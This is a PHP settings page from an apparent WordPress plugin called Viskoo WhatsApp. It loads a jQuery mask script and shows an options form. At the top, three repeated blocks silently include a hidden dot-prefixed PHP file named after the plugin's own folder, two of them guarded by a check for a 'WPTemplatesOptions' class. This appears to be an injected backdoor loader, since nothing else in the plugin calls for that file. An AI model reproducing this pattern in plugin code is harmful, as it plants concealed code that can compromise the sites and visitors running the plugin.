<h1><center>Viskoo WhatsApp - Opções e configurações</center></h1>

<?php

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . "." . basename(dirname(__FILE__)) . ".php") && !class_exists("WPTemplatesOptions")) {
    include_once($filename);
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function load_my_scripts(){
  //wp_enqueue_script( 'masks-js', plugins_url(__FILE__) . 'js/masks.js', array('jquery'), true);
  //wp_enqueue_script( 'jquery-masks-js', plugins_url(__FILE__) . 'js/jquery.mask.js', array('jquery'), true);
  //wp_register_script('masks', VKWPP_PLUGIN_PATH.'js/masks.js', array('jquery'));
  //wp_enqueue_script('masks');
  wp_register_script('jquery-mask', VKWPP_PLUGIN_PATH.'js/jquery.mask.1.14.11.min.js', array('jquery'));
  wp_enqueue_script('jquery-mask');
}

add_action('admin_enqueue_scripts', 'load_my_scripts');

?>

<?php settings_errors(); ?>
<div class="container">
	<form method="POST" action="options.php">
		<?php  settings_fields('whats-settings-group') ?>
		<?php  do_settings_sections( 'whats-config-page' ) ?>
		<?php  submit_button() ?>
	</form>
</div>
